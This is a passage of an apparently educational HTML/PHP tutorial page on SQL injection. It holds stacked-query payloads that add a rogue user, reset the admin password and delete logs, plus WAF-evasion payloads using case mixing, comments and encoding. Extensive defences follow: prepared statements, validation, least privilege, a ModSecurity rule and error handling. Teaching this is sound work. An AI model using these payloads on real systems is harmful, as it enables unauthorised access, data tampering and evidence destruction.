<span class="code-string">'; INSERT INTO users VALUES ('hacker','pass')--</span>    <span class="code-comment">-- Add user</span>
<span class="code-string">'; UPDATE users SET password='hacked' WHERE username='admin'--</span>
<span class="code-string">'; DELETE FROM logs--</span>                              <span class="code-comment">-- Clear evidence</span></code></pre>
        </div>

        <div class="danger-box">
          <strong>⚠️ Warning:</strong> Stacked queries require specific database configurations (e.g., mysql_multi_query
          in PHP) and are less common in modern applications. However, when available, they enable devastating attacks
          including data destruction and privilege escalation.
        </div>
      </div>

      <!-- Section 6: Bypass -->
      <div id="bypass" class="content-card">
        <h2 class="card-title">
          <i>🚧</i> WAF Bypass Techniques
        </h2>

        <p class="text-content">
          Web Application Firewalls (WAFs) attempt to detect and block SQL injection attempts using signature-based
          detection. Advanced attackers employ various evasion techniques to bypass these protections.
        </p>

        <h3 class="subsection-title">1. Case Variation</h3>
        <p class="text-content">
          Many WAFs use case-sensitive pattern matching. Mixing uppercase and lowercase can bypass simple filters.
        </p>
        <div class="code-block">
          <div class="code-header">
            <span class="code-label">Case Obfuscation</span>
          </div>
          <pre><code><span class="code-keyword">UnIoN</span> <span class="code-keyword">SeLeCt</span> <span class="code-keyword">UsEr</span>(), <span class="code-keyword">PaSsWoRd</span> <span class="code-keyword">FrOm</span> <span class="code-keyword">UsErS</span>--
<span class="code-keyword">uNiOn</span> <span class="code-keyword">sElEcT</span> * <span class="code-keyword">fRoM</span> <span class="code-keyword">iNfOrMaTiOn_ScHeMa</span>.<span class="code-keyword">tAbLeS</span>--</code></pre>
        </div>

        <h3 class="subsection-title">2. Comment Insertion</h3>
        <p class="text-content">
          SQL comments (<code class="font-mono">/**/</code>) can be inserted between keywords to break signature
          patterns while maintaining valid SQL syntax.
        </p>
        <div class="code-block">
          <div class="code-header">
            <span class="code-label">Comment Injection</span>
          </div>
          <pre><code><span class="code-keyword">UNION</span>/**/<span class="code-keyword">SELECT</span>/**/username,password/**/<span class="code-keyword">FROM</span>/**/users--
<span class="code-keyword">SEL</span>/**/<span class="code-keyword">ECT</span> * <span class="code-keyword">FR</span>/**/<span class="code-keyword">OM</span> users <span class="code-keyword">WH</span>/**/<span class="code-keyword">ERE</span> id = <span class="code-keyword">1</span></code></pre>
        </div>

        <h3 class="subsection-title">3. URL Encoding</h3>
        <p class="text-content">
          Encoding special characters can bypass filters that don't properly decode input before analysis.
        </p>
        <div class="code-block">
          <div class="code-header">
            <span class="code-label">Encoding Techniques</span>
          </div>
          <pre><code><span class="code-comment">-- Single quote encoded</span>
<span class="code-string">%27</span> <span class="code-keyword">OR</span> <span class="code-string">%27</span><span class="code-keyword">1</span><span class="code-string">%27</span>=<span class="code-string">%27</span><span class="code-keyword">1</span>

<span class="code-comment">-- Double URL encoding</span>
<span class="code-string">%2527</span> <span class="code-keyword">OR</span> <span class="code-string">%2527</span><span class="code-keyword">1</span><span class="code-string">%2527</span>=<span class="code-string">%2527</span><span class="code-keyword">1</span>

<span class="code-comment">-- Unicode encoding</span>
<span class="code-string">%u0027</span> <span class="code-keyword">OR</span> <span class="code-string">%u0027</span><span class="code-keyword">1</span><span class="code-string">%u0027</span>=<span class="code-string">%u0027</span><span class="code-keyword">1</span></code></pre>
        </div>

        <h3 class="subsection-title">4. Alternative Syntax</h3>
        <p class="text-content">
          Using equivalent SQL operators and functions that achieve the same result but bypass specific signatures.
        </p>
        <div class="code-block">
          <div class="code-header">
            <span class="code-label">Syntax Alternatives</span>
          </div>
          <pre><code><span class="code-comment">-- Instead of OR</span>
<span class="code-string">' || '1'='1</span>                    <span class="code-comment">-- ANSI SQL concatenation</span>
<span class="code-string">' | '1'='1</span>                     <span class="code-comment">-- Bitwise OR</span>

<span class="code-comment">-- Instead of AND</span>
<span class="code-string">' && '1'='1</span>                    <span class="code-comment">-- Logical AND operator</span>

<span class="code-comment">-- Instead of SELECT</span>
<span class="code-keyword">SEL</span>/**/<span class="code-keyword">ECT</span>                     <span class="code-comment">-- With comment</span>
<span class="code-keyword">/*!50000SELECT*/</span>                <span class="code-comment">-- MySQL conditional comment</span>

<span class="code-comment">-- Instead of UNION</span>
<span class="code-keyword">UNI</span>+<span class="code-keyword">ON</span> <span class="code-keyword">SEL</span>+<span class="code-keyword">ECT</span>               <span class="code-comment">-- Plus sign concatenation</span></code></pre>
        </div>

        <h3 class="subsection-title">5. Logical Operators</h3>
        <p class="text-content">
          Using mathematical and logical operators to construct true conditions without using <code
            class="font-mono">OR 1=1</code>.
        </p>
        <div class="code-block">
          <div class="code-header">
            <span class="code-label">Alternative True Conditions</span>
          </div>
          <pre><code><span class="code-string">' OR 'a'='a</span>                    <span class="code-comment">-- String comparison</span>
<span class="code-string">' OR 2>1</span>                       <span class="code-comment">-- Mathematical comparison</span>
<span class="code-string">' OR 'x' LIKE 'x</span>              <span class="code-comment">-- LIKE operator</span>
<span class="code-string">' OR NOT 1=0</span>                   <span class="code-comment">-- NOT operator</span>
<span class="code-string">' OR 1 IS NOT NULL</span>             <span class="code-comment">-- IS NOT NULL</span>
<span class="code-string">' OR LENGTH('a')=1</span>             <span class="code-comment">-- Function-based</span></code></pre>
        </div>
      </div>

      <!-- Section 7: Mitigation -->
      <div id="mitigation" class="content-card">
        <h2 class="card-title">
          <i>🛡️</i> Defense & Mitigation Strategies
        </h2>

        <h3 class="subsection-title">Layer 1: Parameterized Queries (Prepared Statements)</h3>
        <p class="text-content">
          The most effective defense against SQL injection is using parameterized queries with prepared statements. This
          ensures that user input is treated as data, never as executable code.
        </p>

        <div class="highlight-box">
          <strong>How It Works:</strong>
          <ol style="margin-left: 2rem; margin-top: 0.5rem;">
            <li>SQL query structure is defined first with placeholders</li>
            <li>User input is bound to these placeholders</li>
            <li>Database driver handles proper escaping automatically</li>
            <li>Input is never concatenated into the query string</li>
          </ol>
        </div>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">PDO Implementation (PHP)</span>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// Using PDO with named parameters</span>
<span class="code-keyword">$stmt</span> = <span class="code-keyword">$pdo</span>-><span class="code-function">prepare</span>(<span class="code-string">"SELECT * FROM users WHERE id = :id AND status = :status"</span>);
<span class="code-keyword">$stmt</span>-><span class="code-function">execute</span>([
    <span class="code-string">':id'</span> => <span class="code-keyword">$_GET</span>[<span class="code-string">'id'</span>],
    <span class="code-string">':status'</span> => <span class="code-string">'active'</span>
]);
<span class="code-keyword">$users</span> = <span class="code-keyword">$stmt</span>-><span class="code-function">fetchAll</span>();

<span class="code-comment">// Using positional parameters</span>
<span class="code-keyword">$stmt</span> = <span class="code-keyword">$pdo</span>-><span class="code-function">prepare</span>(<span class="code-string">"SELECT * FROM users WHERE email = ? AND password = ?"</span>);
<span class="code-keyword">$stmt</span>-><span class="code-function">execute</span>([<span class="code-keyword">$email</span>, <span class="code-keyword">$password_hash</span>]);
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">MySQLi Implementation</span>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">$stmt</span> = <span class="code-keyword">$conn</span>-><span class="code-function">prepare</span>(<span class="code-string">"SELECT * FROM products WHERE id = ?"</span>);
<span class="code-keyword">$stmt</span>-><span class="code-function">bind_param</span>(<span class="code-string">"i"</span>, <span class="code-keyword">$id</span>);  <span class="code-comment">// "i" indicates integer type</span>
<span class="code-keyword">$id</span> = <span class="code-keyword">$_GET</span>[<span class="code-string">'id'</span>];
<span class="code-keyword">$stmt</span>-><span class="code-function">execute</span>();
<span class="code-keyword">$result</span> = <span class="code-keyword">$stmt</span>-><span class="code-function">get_result</span>();
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 2: Input Validation</h3>
        <p class="text-content">
          While not sufficient alone, input validation adds a defense layer by rejecting unexpected data before it
          reaches the database layer.
        </p>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">Whitelist Validation</span>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// Validate integer IDs</span>
<span class="code-keyword">$id</span> = <span class="code-keyword">$_GET</span>[<span class="code-string">'id'</span>];
<span class="code-keyword">if</span> (!<span class="code-function">filter_var</span>(<span class="code-keyword">$id</span>, <span class="code-function">FILTER_VALIDATE_INT</span>)) {
    <span class="code-function">die</span>(<span class="code-string">"Invalid ID format"</span>);
}

<span class="code-comment">// Validate email format</span>
<span class="code-keyword">$email</span> = <span class="code-keyword">$_POST</span>[<span class="code-string">'email'</span>];
<span class="code-keyword">if</span> (!<span class="code-function">filter_var</span>(<span class="code-keyword">$email</span>, <span class="code-function">FILTER_VALIDATE_EMAIL</span>)) {
    <span class="code-function">die</span>(<span class="code-string">"Invalid email format"</span>);
}

<span class="code-comment">// Whitelist allowed characters</span>
<span class="code-keyword">$username</span> = <span class="code-keyword">$_POST</span>[<span class="code-string">'username'</span>];
<span class="code-keyword">if</span> (!<span class="code-function">preg_match</span>(<span class="code-string">'/^[a-zA-Z0-9_]{3,20}$/'</span>, <span class="code-keyword">$username</span>)) {
    <span class="code-function">die</span>(<span class="code-string">"Invalid username format"</span>);
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 3: Least Privilege Principle</h3>
        <p class="text-content">
          Database accounts used by applications should have minimal necessary permissions. Never use root or
          administrative accounts for application connections.
        </p>

        <div class="highlight-box">
          <strong>Recommended Permissions:</strong>
          <ul style="margin-left: 2rem;">
            <li>Application user: SELECT, INSERT, UPDATE, DELETE only on necessary tables</li>
            <li>No DROP, ALTER, or CREATE permissions for application accounts</li>
            <li>No FILE privilege (prevents reading/writing server files)</li>
            <li>Separate read-only accounts for reporting features</li>
          </ul>
        </div>

        <div class="code-block">
          <div class="code-header">
            <span class="code-label">MySQL Privilege Setup</span>
          </div>
          <pre><code><span class="code-comment">-- Create limited application user</span>
<span class="code-keyword">CREATE USER</span> <span class="code-string">'webapp_user'</span>@<span class="code-string">'localhost'</span> <span class="code-keyword">IDENTIFIED BY</span> <span class="code-string">'strong_password'</span>;

<span class="code-comment">-- Grant only necessary permissions</span>
<span class="code-keyword">GRANT SELECT</span>, <span class="code-keyword">INSERT</span>, <span class="code-keyword">UPDATE</span> <span class="code-keyword">ON</span> myapp.users <span class="code-keyword">TO</span> <span class="code-string">'webapp_user'</span>@<span class="code-string">'localhost'</span>;
<span class="code-keyword">GRANT SELECT</span> <span class="code-keyword">ON</span> myapp.products <span class="code-keyword">TO</span> <span class="code-string">'webapp_user'</span>@<span class="code-string">'localhost'</span>;

<span class="code-comment">-- Explicitly revoke dangerous permissions</span>
<span class="code-keyword">REVOKE ALL PRIVILEGES</span> <span class="code-keyword">ON</span> *.* <span class="code-keyword">FROM</span> <span class="code-string">'webapp_user'</span>@<span class="code-string">'localhost'</span>;
<span class="code-keyword">FLUSH PRIVILEGES</span>;</code></pre>
        </div>

        <h3 class="subsection-title">Layer 4: Web Application Firewall (WAF)</h3>
        <p class="text-content">
          A properly configured WAF can block many SQL injection attempts, but should not be the sole defense. Use in
          conjunction with secure coding practices.
        </p>

        <div class="code-block">
          <div class="code-header">
            <span class="code-label">ModSecurity Rules (Example)</span>
          </div>
          <pre><code><span class="code-comment"># Detect common SQL injection patterns</span>
<span class="code-keyword">SecRule</span> REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* \
    <span class="code-string">"(?i:(?:select\s*[\*\)]+.*?\s*from|(?:delete\s*drop\s*truncate)\s*table|union\s*select.*from|into\s*(?:outfile|dumpfile)))"</span> \
    <span class="code-string">"id:942100,phase:2,deny,status:403,msg:'SQL Injection Attack Detected'"</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 5: Error Handling</h3>
        <p class="text-content">
          Never expose detailed database error messages to users. Use generic error messages and log details internally.
        </p>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">Secure Error Handling</span>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">try</span> {
    <span class="code-keyword">$stmt</span> = <span class="code-keyword">$pdo</span>-><span class="code-function">prepare</span>(<span class="code-string">"SELECT * FROM users WHERE id = :id"</span>);
    <span class="code-keyword">$stmt</span>-><span class="code-function">execute</span>([<span class="code-string">':id'</span> => <span class="code-keyword">$id</span>]);
} <span class="code-keyword">catch</span> (<span class="code-function">PDOException</span> <span class="code-keyword">$e</span>) {
    <span class="code-comment">// Log detailed error for administrators</span>
    <span class="code-function">error_log</span>(<span class="code-string">"Database error: "</span> . <span class="code-keyword">$e</span>-><span class="code-function">getMessage</span>());
    
    <span class="code-comment">// Show generic message to user</span>
    <span class="code-keyword">echo</span> <span class="code-string">"An error occurred. Please try again later."</span>;
    <span class="code-keyword">exit</span>;
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>
      </div>

      <!-- Section 8: Advanced -->
      <div id="advanced" class="content-card">
        <h2 class="card-title">
          <i>🚀</i> Advanced Topics
        </h2>

        <h3 class="subsection-title">Second-Order SQL Injection</h3>
        <p class="text-content">
          Occurs when malicious input is stored in the database (safely), then later used in a different query without
          proper sanitization. The injection happens on the second use of the data.
        </p>
        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">Second-Order Example</span>
          </div>
          <pre><code><span class="code-comment">-- Step 1: User registers with malicious username (stored safely)</span>
<span class="code-keyword">INSERT INTO</span> users (username) <span class="code-keyword">VALUES</span> (<span class="code-string">'admin'' --'</span>);  <span class="code-comment">-- Stored as string</span>

<span class="code-comment">-- Step 2: Later, admin panel uses this username in a query</span>
<span class="code-keyword">$query</span> = <span class="code-string">"SELECT * FROM logs WHERE username = '$username'"</span>;
<span class="code-comment">-- Becomes: SELECT * FROM logs WHERE username = 'admin' --'</span>
<span class="code-comment">-- Injects into second query!</span></code></pre>
        </div>

        <h3 class="subsection-title">SQL Injection in JSON/XML</h3>
        <p class="text-content">
          Modern applications using JSON or XML data formats can still be vulnerable if the extracted values are
          concatenated into SQL queries.
        </p>

        <h3 class="subsection-title">ORM Injection</h3>
        <p class="text-content">
          Object-Relational Mapping (ORM) frameworks like Hibernate, Doctrine, or Eloquent are not immune. Unsafe
          methods like <code class="font-mono">whereRaw()</code> or <code class="font-mono">find_by_sql()</code> can
          introduce vulnerabilities.
        </p>

        <div class="warning-box">
          <strong>Laravel Example (Vulnerable):</strong><br>
          <code class="font-mono">User::whereRaw("username = '$username'")->get();</code> - Vulnerable!<br><br>
          <strong>Safe Alternative:</strong><br>
          <code class="font-mono">User::where('username', $username)->get();</code> - Uses parameterization
        </div>

        <h3 class="subsection-title">NoSQL Injection</h3>
        <p class="text-content">
          Non-relational databases (MongoDB, CouchDB) can also be injected if user input is passed directly to query
          operators without sanitization.
        </p>
        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">MongoDB Injection</span>
          </div>
          <pre><code><span class="code-comment">// Vulnerable Node.js code</span>
db.users.find({
  username: req.body.username,
  password: req.body.password
});

<span class="code-comment">// Payload: {"username": {"$ne": null}, "password": {"$ne": null}}</span>
<span class="code-comment">// Returns all users!</span>

<span class="code-comment">// Secure: Use proper input validation and type checking</span></code></pre>
        </div>
      </div>

    </main>
  </div>

  <script>
  // Simple sidebar toggle for mobile
  function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    sidebar.style.transform = sidebar.style.transform === 'translateX(0%)' ? 'translateX(-100%)' : 'translateX(0%)';
  }

  // Smooth scroll for anchor links
  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function(e) {
      e.preventDefault();
      const target = document.querySelector(this.getAttribute('href'));
      if (target) {
        target.scrollIntoView({
          behavior: 'smooth',
          block: 'start'
        });
      }
    });
  });

  // Copy code functionality
  function copyCode(btn) {
    const codeBlock = btn.closest('.code-block').querySelector('pre');
    const text = codeBlock.textContent;
    navigator.clipboard.writeText(text).then(() => {
      btn.textContent = '✅ Copied!';
      setTimeout(() => btn.textContent = '📋 Copy', 2000);
    });
  }
  </script>
  <?php if (!$isLoggedIn): ?>
  <script>
  window.addEventListener("load", function() {
    if (typeof LoginModal !== "undefined") {
      LoginModal.show();
    }
  });
  </script>
  <?php endif; ?>

</body>

</html>